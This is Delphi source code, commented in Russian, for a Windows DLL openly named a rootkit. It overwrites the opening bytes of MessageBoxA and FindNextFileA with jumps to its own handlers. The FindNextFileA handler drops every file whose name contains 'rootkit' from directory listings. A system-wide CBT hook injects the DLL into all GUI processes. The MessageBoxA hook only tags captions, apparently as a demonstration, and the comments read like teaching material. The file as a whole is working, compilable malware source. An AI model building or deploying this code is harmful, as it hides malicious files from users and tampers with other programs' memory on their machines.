library rootkit_lib;
uses
  Windows,
  SysUtils,
  Classes,
  TlHelp32;

type
 // Информация о перехваченной функции
 TInterceptInfo = record
  LibraryName  : string;  // Имя DLL
  FunctionName : string;  // Имя функции
  FunctionAddr : Pointer; // Адрес функции
  HookAddr     : Pointer; // Адрес перехватчика
  FunctCode    : packed array [0..4] of byte; // Первые байты кода функции
  HookJMP      : packed array [0..4] of byte; // JMP на перехватчик
 end;
var
 HookHandle   : hHook;      // Handle, возвращаемый SetWindowsHookEx
 MessageBoxInterceptInfo    : TInterceptInfo;
 FindNextFileAInterceptInfo : TInterceptInfo;
// Модификация машинного кода функции
function SetHookCode(InterceptInfo : TInterceptInfo; ASetHook : boolean) : boolean;
const
 CodeSize = 5; // Размер модифицируемого кода
var
 Tmp, OldProtect     : dword;
begin
 // 1. Настройка защиты
 VirtualProtect(InterceptInfo.FunctionAddr, CodeSize, PAGE_EXECUTE_READWRITE, OldProtect);
 // 2. Запись в первые байты машинного кода функции
 if ASetHook then
  Result := WriteProcessMemory(GetCurrentProcess, InterceptInfo.FunctionAddr,
                     @InterceptInfo.HookJMP[0], CodeSize, Tmp)
 else
  Result := WriteProcessMemory(GetCurrentProcess, InterceptInfo.FunctionAddr,
                     @InterceptInfo.FunctCode[0], CodeSize, Tmp);
 // 3. Восстановление атрибутов защиты
 VirtualProtect(InterceptInfo.FunctionAddr, CodeSize, OldProtect, Tmp);
end;

function InterceptFunctionEx(ALibName, AFunctName : string; var InterceptInfo : TInterceptInfo; HookFunct: Pointer) : boolean;
var
 Tmp     : dword;
 JMP_Rel : dword;
begin
 Result := false;
 // 1. Поиск адреса фукции
 InterceptInfo.FunctionAddr := GetProcAddress(GetModuleHandle(PChar(ALibName)), PChar(AFunctName));
 if InterceptInfo.FunctionAddr = nil then exit;
 // 2. Сохранение параметров в структуре
 InterceptInfo.LibraryName  := ALibName;
 InterceptInfo.FunctionName := AFunctName;
 InterceptInfo.HookAddr     := HookFunct;
 // 3. Считывание машинного кода функции
 Result := ReadProcessMemory(GetCurrentProcess,
                    InterceptInfo.FunctionAddr,
                    @InterceptInfo.FunctCode[0], 5, Tmp);
 if not(Result) then exit;
 // Подготовка буфера с командой JMP, формат E9 хх хх хх хх
 JMP_Rel := DWORD(HookFunct) - (DWORD(InterceptInfo.FunctionAddr) + 5);
 InterceptInfo.HookJMP[0] := $0E9;
 CopyMemory(@InterceptInfo.HookJMP[1], @JMP_Rel, 4);
 // Запись машинного кода JMP, передающего управление перехватчику
 Result := SetHookCode(InterceptInfo, true);
end;

// Перехватчик MessageBoxA
function myMessageBoxA(hWnd: HWND; lpText, lpCaption: PAnsiChar; uType: UINT): Integer; stdcall;
begin
 // 1. Восстанавливаем машинный код функции
 SetHookCode(MessageBoxInterceptInfo, false);
 // 2. Вызываем функцию
 Result := MessageBoxA(hWnd, lpText, PChar(String(lpCaption)+'(перехвачена !)'), uType);
 // 3. Восстанавливаем JMP на наш перехватчик
 SetHookCode(MessageBoxInterceptInfo, true);
end;

function myFindNextFileA(hFindFile: THandle; var lpFindFileData: TWIN32FindDataA): BOOL; stdcall;
begin
 try
  // 1. Восстанавливаем машинный код функции
  SetHookCode(FindNextFileAInterceptInfo, false);
  // 2. Вызываем функцию
  Result := FindNextFileA(hFindFile, lpFindFileData);
  while Result do begin
   if pos('rootkit', LowerCase(lpFindFileData.cFileName)) = 0 then exit;
   Result := FindNextFileA(hFindFile, lpFindFileData);
  end;
 finally
  // 3. Восстанавливаем JMP на наш перехватчик
  SetHookCode(FindNextFileAInterceptInfo, true);
 end;
end;

// Функция-обработчик перехватчика
function KeyHook(nCode: integer; WParam: Word; LParam: LongInt): Longint; stdcall;
begin
 // Вызов следующего в цепочке обработчика
 Result := CallNextHookEx(HookHandle, nCode, WParam, LParam);
end;

begin
// MessageBoxA(0, 'Message1', 'Rootkit', 0);
 // Перехват MessageBoxA
 InterceptFunctionEx('user32.dll','MessageBoxA',
                     MessageBoxInterceptInfo, @myMessageBoxA);
 InterceptFunctionEx('kernel32.dll','FindNextFileA',
                     FindNextFileAInterceptInfo, @myFindNextFileA);

// MessageBoxA(0, 'Message2', 'Rootkit', 0);
 HookHandle      := SetWindowsHookEx(WH_CBT, @KeyHook, HInstance, 0);
end.

